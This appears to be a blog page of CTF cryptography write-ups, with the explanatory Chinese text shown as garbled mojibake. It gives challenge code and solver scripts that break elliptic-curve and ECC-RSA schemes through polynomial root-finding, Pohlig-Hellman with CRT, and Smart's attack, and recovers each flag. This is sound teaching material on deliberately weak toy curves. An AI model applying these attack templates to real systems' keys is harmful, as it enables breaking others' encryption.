<h1 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h1><p>é€šè¿‡ä¾‹é¢˜æ¥ç†Ÿæ‚‰è¿™äº›æ¦‚å¿µå’Œæ–¹æ³•å§</p>
<h2 id="2022å·…å³°æå®¢-point-power"><a href="#2022å·…å³°æå®¢-point-power" class="headerlink" title="2022å·…å³°æå®¢ point-power"></a>2022å·…å³°æå®¢ point-power</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag)==<span class="number">42</span></span><br><span class="line">p=getPrime(<span class="number">600</span>)</span><br><span class="line">a=bytes_to_long(flag)</span><br><span class="line">b=randrange(<span class="number">2</span>,p-<span class="number">1</span>)</span><br><span class="line">E=EllipticCurve(GF(p),[a,b])</span><br><span class="line">G=E.random_element()</span><br><span class="line"></span><br><span class="line">x1,y1,_=G</span><br><span class="line">G=<span class="number">2</span>*G</span><br><span class="line">x2,y2,_=G</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;b = <span class="subst">&#123;b&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;x1 = <span class="subst">&#123;x1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;x2 = <span class="subst">&#123;x2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 3660057339895840489386133099442699911046732928957592389841707990239494988668972633881890332850396642253648817739844121432749159024098337289268574006090698602263783482687565322890623</span></span><br><span class="line"><span class="string">b = 1515231655397326550194746635613443276271228200149130229724363232017068662367771757907474495021697632810542820366098372870766155947779533427141016826904160784021630942035315049381147</span></span><br><span class="line"><span class="string">x1 = 2157670468952062330453195482606118809236127827872293893648601570707609637499023981195730090033076249237356704253400517059411180554022652893726903447990650895219926989469443306189740</span></span><br><span class="line"><span class="string">x2 = 1991876990606943816638852425122739062927245775025232944491452039354255349384430261036766896859410449488871048192397922549895939187691682643754284061389348874990018070631239671589727</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œå¯ä»¥ç›´æ¥ç”¨åŠ æ³•å…¬å¼<br>å†™å‡ºæ¥æ¶ˆå…ƒå¾—åˆ°åªå«x1çš„æ–¹ç¨‹ sageè§£å°±è¡Œäº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = <span class="number">3660057339895840489386133099442699911046732928957592389841707990239494988668972633881890332850396642253648817739844121432749159024098337289268574006090698602263783482687565322890623</span></span><br><span class="line">b = <span class="number">1515231655397326550194746635613443276271228200149130229724363232017068662367771757907474495021697632810542820366098372870766155947779533427141016826904160784021630942035315049381147</span></span><br><span class="line">x1 = <span class="number">2157670468952062330453195482606118809236127827872293893648601570707609637499023981195730090033076249237356704253400517059411180554022652893726903447990650895219926989469443306189740</span></span><br><span class="line">x2 = <span class="number">1991876990606943816638852425122739062927245775025232944491452039354255349384430261036766896859410449488871048192397922549895939187691682643754284061389348874990018070631239671589727</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PR.&lt;a&gt; = PolynomialRing(Zmod(p))</span></span><br><span class="line"><span class="comment"># f = (3*x1**2+a)^2-4*(x1^3+a*x1+b)*(2*x1+x2)</span></span><br><span class="line"><span class="comment"># f = f.monic()</span></span><br><span class="line"><span class="comment"># print(f.roots())</span></span><br><span class="line"></span><br><span class="line">[(<span class="number">918875439627055594259552478508551728381826199399685938622511660790511287097297184191298481453657480331998130281110691444641445094194011219176724349745237973925436007792522611119050</span>, <span class="number">1</span>), (<span class="number">56006392793430010663016642098239513811260175999551893260401436587175373756825079518464264729364083325</span>, <span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line">flags = [<span class="number">918875439627055594259552478508551728381826199399685938622511660790511287097297184191298481453657480331998130281110691444641445094194011219176724349745237973925436007792522611119050</span>,<span class="number">56006392793430010663016642098239513811260175999551893260401436587175373756825079518464264729364083325</span>]</span><br><span class="line"><span class="keyword">for</span> flag <span class="keyword">in</span> flags:</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(flag))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;fa76cfb1-0052-4416-914d-91517bcebd52&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="watevrCTF2019-ECC-RSA"><a href="#watevrCTF2019-ECC-RSA" class="headerlink" title="watevrCTF2019 ECC-RSA"></a>watevrCTF2019 ECC-RSA</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fastecdsa.curve <span class="keyword">import</span> P521 <span class="keyword">as</span> Curve</span><br><span class="line"><span class="keyword">from</span> fastecdsa.point <span class="keyword">import</span> Point</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, isPrime</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_rsa_primes</span>(<span class="params">G</span>):</span><br><span class="line">	urand = bytes_to_long(urandom(<span class="number">521</span>//<span class="number">8</span>))</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		s = getrandbits(<span class="number">521</span>) ^ urand</span><br><span class="line"></span><br><span class="line">		Q = s*G</span><br><span class="line">		<span class="keyword">if</span> isPrime(Q.x) <span class="keyword">and</span> isPrime(Q.y):</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;ECC Private key:&quot;</span>, <span class="built_in">hex</span>(s))</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;RSA primes:&quot;</span>, <span class="built_in">hex</span>(Q.x), <span class="built_in">hex</span>(Q.y))</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;Modulo:&quot;</span>, <span class="built_in">hex</span>(Q.x * Q.y))</span><br><span class="line">			<span class="keyword">return</span> (Q.x, Q.y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">int</span>.from_bytes(<span class="built_in">input</span>(), byteorder=<span class="string">&quot;big&quot;</span>)</span><br><span class="line"></span><br><span class="line">ecc_p = Curve.p</span><br><span class="line">a = Curve.a</span><br><span class="line">b = Curve.b</span><br><span class="line"></span><br><span class="line">Gx = Curve.gx</span><br><span class="line">Gy = Curve.gy</span><br><span class="line">G = Point(Gx, Gy, curve=Curve)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">p, q = gen_rsa_primes(G)</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file_out = <span class="built_in">open</span>(<span class="string">&quot;downloads/ecc-rsa.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"></span><br><span class="line">file_out.write(<span class="string">&quot;ECC Curve Prime: &quot;</span> + <span class="built_in">hex</span>(ecc_p) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">file_out.write(<span class="string">&quot;Curve a: &quot;</span> + <span class="built_in">hex</span>(a) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">file_out.write(<span class="string">&quot;Curve b: &quot;</span> + <span class="built_in">hex</span>(b) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">file_out.write(<span class="string">&quot;Gx: &quot;</span> + <span class="built_in">hex</span>(Gx) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">file_out.write(<span class="string">&quot;Gy: &quot;</span> + <span class="built_in">hex</span>(Gy) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">file_out.write(<span class="string">&quot;e: &quot;</span> + <span class="built_in">hex</span>(e) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">file_out.write(<span class="string">&quot;p * q: &quot;</span> + <span class="built_in">hex</span>(n) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(flag, e, n)</span><br><span class="line">file_out.write(<span class="string">&quot;ciphertext: &quot;</span> + <span class="built_in">hex</span>(c) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ECC Curve Prime: 0x1ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span><br><span class="line">Curve a: -0x3</span><br><span class="line">Curve b: 0x51953eb9618e1c9a1f929a21a0b68540eea2da725b99b315f3b8b489918ef109e156193951ec7e937b1652c0bd3bb1bf073573df883d2c34f1ef451fd46b503f00</span><br><span class="line">Gx: 0xc6858e06b70404e9cd9e3ecb662395b4429c648139053fb521f828af606b4d3dbaa14b5e77efe75928fe1dc127a2ffa8de3348b3c1856a429bf97e7e31c2e5bd66</span><br><span class="line">Gy: 0x11839296a789a3bc0045c8a5fb42c7d1bd998f54449579b446817afbd17273e662c97ee72995ef42640c550b9013fad0761353c7086a272c24088be94769fd16650</span><br><span class="line">e: 0x10001</span><br><span class="line">p * q: 0x118aaa1add80bdd0a1788b375e6b04426c50bb3f9cae0b173b382e3723fc858ce7932fb499cd92f5f675d4a2b05d2c575fc685f6cf08a490d6c6a8a6741e8be4572adfcba233da791ccc0aee033677b72788d57004a776909f6d699a0164af514728431b5aed704b289719f09d591f5c1f9d2ed36a58448a9d57567bd232702e9b28f</span><br><span class="line">ciphertext: 0x3862c872480bdd067c0c68cfee4527a063166620c97cca4c99baff6eb0cf5d42421b8f8d8300df5f8c7663adb5d21b47c8cb4ca5aab892006d7d44a1c5b5f5242d88c6e325064adf9b969c7dfc52a034495fe67b5424e1678ca4332d59225855b7a9cb42db2b1db95a90ab6834395397e305078c5baff78c4b7252d7966365afed9e</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>åˆ©ç”¨ <code>n = Q.x*Q.y</code><br>ä¸”(Q.x,Q.y)åœ¨æ›²çº¿ä¸Šæ¥è”ç«‹æ±‚è§£<br>è¿™é‡Œæˆ‘ä»¬æ„é€  <code>(Q.x*Q.y)^2-n^2===0 mod P</code> æ¥æ±‚è§£</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">P = <span class="number">0x1ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line">a = -<span class="number">0x3</span></span><br><span class="line">b = <span class="number">0x51953eb9618e1c9a1f929a21a0b68540eea2da725b99b315f3b8b489918ef109e156193951ec7e937b1652c0bd3bb1bf073573df883d2c34f1ef451fd46b503f00</span></span><br><span class="line">Gx = <span class="number">0xc6858e06b70404e9cd9e3ecb662395b4429c648139053fb521f828af606b4d3dbaa14b5e77efe75928fe1dc127a2ffa8de3348b3c1856a429bf97e7e31c2e5bd66</span></span><br><span class="line">Gy = <span class="number">0x11839296a789a3bc0045c8a5fb42c7d1bd998f54449579b446817afbd17273e662c97ee72995ef42640c550b9013fad0761353c7086a272c24088be94769fd16650</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = <span class="number">0x118aaa1add80bdd0a1788b375e6b04426c50bb3f9cae0b173b382e3723fc858ce7932fb499cd92f5f675d4a2b05d2c575fc685f6cf08a490d6c6a8a6741e8be4572adfcba233da791ccc0aee033677b72788d57004a776909f6d699a0164af514728431b5aed704b289719f09d591f5c1f9d2ed36a58448a9d57567bd232702e9b28f</span></span><br><span class="line">c = <span class="number">0x3862c872480bdd067c0c68cfee4527a063166620c97cca4c99baff6eb0cf5d42421b8f8d8300df5f8c7663adb5d21b47c8cb4ca5aab892006d7d44a1c5b5f5242d88c6e325064adf9b969c7dfc52a034495fe67b5424e1678ca4332d59225855b7a9cb42db2b1db95a90ab6834395397e305078c5baff78c4b7252d7966365afed9e</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># E = EllipticCurve(GF(P),a,b)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PR.&lt;x&gt; = PolynomialRing(Zmod(P))</span></span><br><span class="line"><span class="comment"># f = (x^3+a*x+b)*(x^2)-n^2</span></span><br><span class="line"><span class="comment"># f = f.monic()</span></span><br><span class="line"><span class="comment"># for root in f.roots():</span></span><br><span class="line"><span class="comment">#     if(is_prime(root[0])):</span></span><br><span class="line"><span class="comment">#         print(root[0])</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">4573744216059593260686660411936793507327994800883645562370166075007970317346237399760397301505506131100113886281839847419425482918932436139080837246914736557</span></span><br><span class="line">q = n//p</span><br><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> modinv</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">d = modinv(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br><span class="line"><span class="comment"># watevr&#123;factoring_polynomials_over_finite_fields_is_too_ez&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="ç¬¬äº”ç©ºé—´2021-ecc"><a href="#ç¬¬äº”ç©ºé—´2021-ecc" class="headerlink" title="ç¬¬äº”ç©ºé—´2021 ecc"></a>ç¬¬äº”ç©ºé—´2021 ecc</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Try to solve the 3 ECC&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">assert</span>(flag[:<span class="number">5</span>]==<span class="string">&#x27;flag&#123;&#x27;</span>)</span><br><span class="line">flag = flag[<span class="number">5</span>:-<span class="number">1</span>]</span><br><span class="line">num1 = bytes_to_long(flag[:<span class="number">7</span>])</span><br><span class="line">num2 = bytes_to_long(flag[<span class="number">7</span>:<span class="number">14</span>])</span><br><span class="line">num3 = bytes_to_long(flag[<span class="number">14</span>:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ECC1</span>(<span class="params">num</span>):</span><br><span class="line">	p = <span class="number">146808027458411567</span></span><br><span class="line">	A = <span class="number">46056180</span></span><br><span class="line">	B = <span class="number">2316783294673</span></span><br><span class="line">	E = EllipticCurve(GF(p),[A,B])</span><br><span class="line">	P = E.random_point() </span><br><span class="line">	Q = num*P</span><br><span class="line">	<span class="built_in">print</span> E</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&#x27;P:&#x27;</span>,P</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&#x27;Q:&#x27;</span>,Q</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ECC2</span>(<span class="params">num</span>):</span><br><span class="line">	p = <span class="number">1256438680873352167711863680253958927079458741172412327087203</span></span><br><span class="line">	<span class="comment">#import random</span></span><br><span class="line">	<span class="comment">#A = random.randrange(389718923781273978681723687163812)</span></span><br><span class="line">	<span class="comment">#B = random.randrange(816378675675716537126387613131232121431231)</span></span><br><span class="line">	A = <span class="number">377999945830334462584412960368612</span></span><br><span class="line">	B = <span class="number">604811648267717218711247799143415167229480</span></span><br><span class="line">	E = EllipticCurve(GF(p),[A,B])</span><br><span class="line">	P = E.random_point() </span><br><span class="line">	Q = num*P</span><br><span class="line">	<span class="built_in">print</span> E</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&#x27;P:&#x27;</span>,P</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&#x27;Q:&#x27;</span>,Q</span><br><span class="line">	factors, exponents = <span class="built_in">zip</span>(*factor(E.order()))</span><br><span class="line">	primes = [factors[i] ^ exponents[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(factors))][:-<span class="number">1</span>]</span><br><span class="line">	<span class="built_in">print</span> primes</span><br><span class="line">	dlogs = []</span><br><span class="line">	<span class="keyword">for</span> fac <span class="keyword">in</span> primes:</span><br><span class="line">		t = <span class="built_in">int</span>(<span class="built_in">int</span>(P.order()) / <span class="built_in">int</span>(fac))</span><br><span class="line">		dlog = discrete_log(t*Q,t*P,operation=<span class="string">&quot;+&quot;</span>)</span><br><span class="line">		dlogs += [dlog]</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;factor: &quot;</span>+<span class="built_in">str</span>(fac)+<span class="string">&quot;, Discrete Log: &quot;</span>+<span class="built_in">str</span>(dlog)) <span class="comment">#calculates discrete logarithm for each prime order</span></span><br><span class="line">	<span class="built_in">print</span> num</span><br><span class="line">	<span class="built_in">print</span> crt(dlogs,primes)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ECC3</span>(<span class="params">num</span>):</span><br><span class="line">	p = <span class="number">0xd3ceec4c84af8fa5f3e9af91e00cabacaaaecec3da619400e29a25abececfdc9bd678e2708a58acb1bd15370acc39c596807dab6229dca11fd3a217510258d1b</span></span><br><span class="line">	A = <span class="number">0x95fc77eb3119991a0022168c83eee7178e6c3eeaf75e0fdf1853b8ef4cb97a9058c271ee193b8b27938a07052f918c35eccb027b0b168b4e2566b247b91dc07</span></span><br><span class="line">	B = <span class="number">0x926b0e42376d112ca971569a8d3b3eda12172dfb4929aea13da7f10fb81f3b96bf1e28b4a396a1fcf38d80b463582e45d06a548e0dc0d567fc668bd119c346b2</span></span><br><span class="line">	E = EllipticCurve(GF(p),[A,B])</span><br><span class="line">	P = E.random_point() </span><br><span class="line">	Q = num*P</span><br><span class="line">	<span class="built_in">print</span> E</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&#x27;P:&#x27;</span>,P</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&#x27;Q:&#x27;</span>,Q</span><br><span class="line"></span><br><span class="line">ECC1(num1)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;==============&#x27;</span></span><br><span class="line">ECC2(num2)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;==============&#x27;</span></span><br><span class="line">ECC3(num3)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ä¸‰å±‚ECC<br>ç¬¬ä¸€éƒ¨åˆ†: æ•°æ®éƒ½å¾ˆå°ç›´æ¥ç¦»æ•£å¯¹æ•°æ±‚è§£<br>ç¬¬äºŒéƒ¨åˆ†: é¢˜ç›®å·²ç»å¸®æˆ‘ä»¬å®ç°äº†å½“æ›²çº¿çš„é˜¶å¯ä»¥åˆ†è§£æ—¶ å¯ä»¥ç”¨CRT+DLPæ¥æ±‚è§£<br>ç¬¬ä¸‰éƒ¨åˆ†: æ›²çº¿çš„é˜¶å’Œpç›¸ç­‰ SmartAttack</p>
<p>ç¬¬ä¸€éƒ¨åˆ†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p1 = <span class="number">146808027458411567</span></span><br><span class="line">A1 = <span class="number">46056180</span></span><br><span class="line">B1 = <span class="number">2316783294673</span></span><br><span class="line">E1 = EllipticCurve(GF(p1),[A1,B1])</span><br><span class="line">P1 = E1(<span class="number">119851377153561800</span>,<span class="number">50725039619018388</span>)</span><br><span class="line">Q1 = E1(<span class="number">22306318711744209</span>,<span class="number">111808951703508717</span>)</span><br><span class="line"></span><br><span class="line">num1 = discrete_log(Q1,P1,operation=<span class="string">&quot;+&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(num1)</span><br><span class="line"><span class="comment"># num1 = 13566003730592612</span></span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒéƒ¨åˆ†<br><a href="http://www.leonlist.top/2020/09/29/CTF%E5%AF%86%E7%A0%81%E5%AD%A6-ECC/" target="_blank">åŸç†</a><br>ä»£ç (æ¨¡æ¿ç›´æ¥å¥—)<br>è¿™é‡Œå‘ç°å¥½å¤šæ¨¡æ¿éƒ½æ˜¯å¯¹Eçš„é˜¶åˆ†è§£ ä½†æ˜¯çœ‹åŸç†æ˜¯è·ŸPçš„é˜¶æœ‰å…³å•Š è¿™é“é¢˜æˆ‘æ¢æˆç”¨Pçš„é˜¶å®Œå…¨æ­£ç¡®(â€¦) ç­‰å¤šåšå‡ é“é¢˜å†æ¥å•†æ¦·(åº”è¯¥æ˜¯é»˜è®¤Pæ˜¯Eçš„ç”Ÿæˆå…ƒå§)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p2 = <span class="number">1256438680873352167711863680253958927079458741172412327087203</span></span><br><span class="line">A2 = <span class="number">377999945830334462584412960368612</span></span><br><span class="line">B2 = <span class="number">604811648267717218711247799143415167229480</span></span><br><span class="line">E2 = EllipticCurve(GF(p2),[A2,B2])</span><br><span class="line">P2 = E2(<span class="number">550637390822762334900354060650869238926454800955557622817950</span>,<span class="number">700751312208881169841494663466728684704743091638451132521079</span>)</span><br><span class="line">Q2 = E2(<span class="number">1152079922659509908913443110457333432642379532625238229329830</span>,<span class="number">819973744403969324837069647827669815566569448190043645544592</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">P,Q,E</span>):</span><br><span class="line">    factors, exponents = <span class="built_in">zip</span>(*factor(P.order())) <span class="comment"># P or E?</span></span><br><span class="line">    primes = [factors[i] ^ exponents[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(factors))][:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(primes)</span><br><span class="line">    dlogs = []</span><br><span class="line">    <span class="keyword">for</span> fac <span class="keyword">in</span> primes:</span><br><span class="line">        t = <span class="built_in">int</span>(<span class="built_in">int</span>(P.order()) // <span class="built_in">int</span>(fac))</span><br><span class="line">        dlog = discrete_log(t*Q,t*P,operation=<span class="string">&quot;+&quot;</span>)</span><br><span class="line">        dlogs += [dlog]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;factor: &quot;</span>+<span class="built_in">str</span>(fac)+<span class="string">&quot;, Discrete Log: &quot;</span>+<span class="built_in">str</span>(dlog)) <span class="comment">#calculates discrete logarithm for each prime order</span></span><br><span class="line">    m = CRT_list(dlogs,primes)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line">num2 = solve(P2,Q2,E2)</span><br><span class="line"><span class="comment"># num2 = 16093767336603949</span></span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸‰éƒ¨åˆ†<br>SmartAttack<br>æ¨¡æ¿</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p3 = <span class="number">0xd3ceec4c84af8fa5f3e9af91e00cabacaaaecec3da619400e29a25abececfdc9bd678e2708a58acb1bd15370acc39c596807dab6229dca11fd3a217510258d1b</span></span><br><span class="line">A3 = <span class="number">0x95fc77eb3119991a0022168c83eee7178e6c3eeaf75e0fdf1853b8ef4cb97a9058c271ee193b8b27938a07052f918c35eccb027b0b168b4e2566b247b91dc07</span></span><br><span class="line">B3 = <span class="number">0x926b0e42376d112ca971569a8d3b3eda12172dfb4929aea13da7f10fb81f3b96bf1e28b4a396a1fcf38d80b463582e45d06a548e0dc0d567fc668bd119c346b2</span></span><br><span class="line">E3 = EllipticCurve(GF(p3),[A3,B3])</span><br><span class="line">P3 = E3(<span class="number">10121571443191913072732572831490534620810835306892634555532657696255506898960536955568544782337611042739846570602400973952350443413585203452769205144937861</span> ,<span class="number">8425218582467077730409837945083571362745388328043930511865174847436798990397124804357982565055918658197831123970115905304092351218676660067914209199149610</span> )</span><br><span class="line">Q3 = E3(<span class="number">964864009142237137341389653756165935542611153576641370639729304570649749004810980672415306977194223081235401355646820597987366171212332294914445469010927</span> ,<span class="number">5162185780511783278449342529269970453734248460302908455520831950343371147566682530583160574217543701164101226640565768860451999819324219344705421407572537</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(p3 == E3.order())</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SmartAttack</span>(<span class="params">P,Q,p</span>):</span><br><span class="line">    E = P.curve()</span><br><span class="line">    Eqp = EllipticCurve(Qp(p, <span class="number">2</span>), [ ZZ(t) + randint(<span class="number">0</span>,p)*p <span class="keyword">for</span> t <span class="keyword">in</span> E.a_invariants() ])</span><br><span class="line"></span><br><span class="line">    P_Qps = Eqp.lift_x(ZZ(P.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> P_Qp <span class="keyword">in</span> P_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(P_Qp.xy()[<span class="number">1</span>]) == P.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    Q_Qps = Eqp.lift_x(ZZ(Q.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> Q_Qp <span class="keyword">in</span> Q_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(Q_Qp.xy()[<span class="number">1</span>]) == Q.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    p_times_P = p*P_Qp</span><br><span class="line">    p_times_Q = p*Q_Qp</span><br><span class="line"></span><br><span class="line">    x_P,y_P = p_times_P.xy()</span><br><span class="line">    x_Q,y_Q = p_times_Q.xy()</span><br><span class="line"></span><br><span class="line">    phi_P = -(x_P/y_P)</span><br><span class="line">    phi_Q = -(x_Q/y_Q)</span><br><span class="line">    k = phi_Q/phi_P</span><br><span class="line">    <span class="keyword">return</span> ZZ(k)</span><br><span class="line"></span><br><span class="line">num3 = SmartAttack(P3,Q3,p3)</span><br><span class="line"><span class="comment"># num3 = 19597596255129283097357413993866074145935170485891892</span></span><br></pre></td></tr></table></figure>

<p>è¿™é“é¢˜å¯¹åº”çš„3ä¸ªpartä¹Ÿæ˜¯ECCå¾ˆå¸¸è§çš„3ç§æ”»å‡»æ–¹æ³• è¦ç†Ÿç»ƒæŒæ¡ è¿ç”¨</p>
<h2 id="é¢†èˆªæ¯æ±Ÿè‹çœèµ›2021-ECC"><a href="#é¢†èˆªæ¯æ±Ÿè‹çœèµ›2021-ECC" class="headerlink" title="é¢†èˆªæ¯æ±Ÿè‹çœèµ›2021 ECC"></a>é¢†èˆªæ¯æ±Ÿè‹çœèµ›2021 ECC</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = <span class="number">64464091191308356774703439660771627086045800299627641179047457478059588557461</span></span><br><span class="line">a = <span class="number">31926335967105564755113987930261069322507794703287741857397622356704769886356</span></span><br><span class="line">b = <span class="number">34835808070187351680507689900273321615070127680320357724483770400791707112940</span></span><br><span class="line">Gx = <span class="number">2053202552422630348010474635096983783565667661786369125783579647572276572403</span></span><br><span class="line">Gy = <span class="number">51320753844844801021362329076409450910659564359017581255542897537756778371539</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>] == <span class="string">&quot;CnHongKe&#123;&quot;</span></span><br><span class="line"><span class="keyword">assert</span> flag[-<span class="number">1</span>] == <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">k = bytes_to_long(flag[<span class="number">9</span>:-<span class="number">1</span>])</span><br><span class="line"><span class="keyword">assert</span> k &lt; <span class="number">32000000000000000000000000000</span></span><br><span class="line"></span><br><span class="line">Zp = Zmod(P)</span><br><span class="line">EC = EllipticCurve(Zp, [a, b])</span><br><span class="line">G = EC(Gx, Gy)</span><br><span class="line">K = k * G</span><br><span class="line"><span class="built_in">print</span> K</span><br><span class="line"></span><br><span class="line"><span class="comment"># (31981799071949968743482831587417174146463993877255771340814476669214408840460 : 15144025062588325012239455117890516531350002058200271280110877844265896081387 : 1)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è¿™ç§æ²¡ç»™é¢å¤–æ¡ä»¶çš„è”æƒ³åˆ°ç”¨CRT+PHæ¥è§£</p>
